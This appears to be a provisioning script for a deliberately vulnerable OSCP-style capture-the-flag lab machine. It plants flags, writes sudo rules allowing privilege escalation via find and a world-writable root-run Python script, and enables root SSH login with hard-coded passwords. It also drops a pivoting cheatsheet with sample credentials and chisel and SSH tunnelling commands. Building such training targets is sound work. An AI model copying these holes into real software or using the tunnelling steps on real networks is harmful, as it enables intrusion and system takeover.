#!/bin/bash
set -e

# Update & install essential tools for OSCP foothold and pivoting
apt-get update -qq
apt-get install -y -qq sudo libsqlite3-dev sqlite3 iproute2 procps python3 openssh-server net-tools iputils-ping curl

# Setup web directory permissions
mkdir -p /var/www/html/uploads
chown -R www-data:www-data /var/www/html
chmod -R 775 /var/www/html/uploads

# Create local.txt for low-privilege user foothold (10 OSCP points)
mkdir -p /home/www-data
chown www-data:www-data /home/www-data
if [ ! -f /home/www-data/local.txt ]; then
    echo "OSCP{dmz_perimeter_foothold_local_txt_10pts}" > /home/www-data/local.txt
fi
chmod 644 /home/www-data/local.txt
cp /home/www-data/local.txt /var/www/local.txt || true

# Configure Local Privilege Escalation (GTFOBins sudo find & writable backup script)
mkdir -p /opt
cat << 'EOF' > /opt/internal_backup.py
#!/usr/bin/env python3
# MegaCorp DMZ Automated Internal Sync & Backup Script
import os, sys, subprocess

print("[*] Running automated backup to internal network...")
# Syncs logs to internal server network 10.20.20.20
EOF
chown www-data:www-data /opt/internal_backup.py
chmod 775 /opt/internal_backup.py

# Sudoers configuration
echo "www-data ALL=(ALL) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/www-data-privesc
echo "www-data ALL=(ALL) NOPASSWD: /usr/bin/python3 /opt/internal_backup.py" >> /etc/sudoers.d/www-data-privesc
chmod 440 /etc/sudoers.d/www-data-privesc

# Create root proof.txt and pivoting notes
if [ ! -f /root/proof.txt ]; then
    echo "OSCP{dmz_perimeter_root_privesc_proof_10pts}" > /root/proof.txt
fi
chmod 600 /root/proof.txt

cat << 'EOF' > /root/pivot_notes.txt
================================================================================
MEGACORP INFRASTRUCTURE PIVOTING & LATERAL MOVEMENT CHEATSHEET
================================================================================
Target Host: DMZ-SRV01 (10.10.10.80) - COMPROMISED (ROOT)

[Internal Protected Subnets via Router (10.10.10.254)]
1. Database & Cache Server Subnet: 10.20.20.0/24
   - PostgreSQL DB Server: 10.20.20.20:5432
     Credentials: postgres / DB_Prod_Admin_SuperSecure_Pass2026!
     Database: production / postgres
     Note: Query table `ad_sync_credentials` for Active Directory bind accounts!
   - Redis Cache: 10.20.20.30:6379 (Unauthenticated)

2. Active Directory Forest Subnet: 10.100.10.0/24
   - Child Domain Controller: 10.100.10.20 (HQ.MEGACORP.LOCAL)
     Domain: HQ / Realm: HQ.MEGACORP.LOCAL
   - Parent Forest Root DC: 10.100.10.10 (MEGACORP.LOCAL)
     Domain: MEGACORP / Realm: MEGACORP.LOCAL

[Pivoting Setup Instructions]
From your Kali/Attack box over WireGuard:
Method A (SSH Dynamic Port Forwarding):
  ssh -D 1080 -N -f root@10.10.10.80
  proxychains impacket-psexec ...

Method B (Chisel Tunnel):
  Attack box:  chisel server -p 8000 --reverse
  DMZ Machine: chisel client 10.252.1.2:8000 R:socks
================================================================================
EOF

# Setup SSH Server on DMZ host for easy pivoting
mkdir -p /var/run/sshd
echo "root:MegaCorpRootAdmin2026!" | chpasswd
(id -u perimeter >/dev/null 2>&1 || useradd -m -s /bin/bash perimeter)
echo "perimeter:PerimeterAccessPass2026!" | chpasswd
sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
/usr/sbin/sshd || true

echo "[+] Perimeter foothold environment successfully provisioned!"
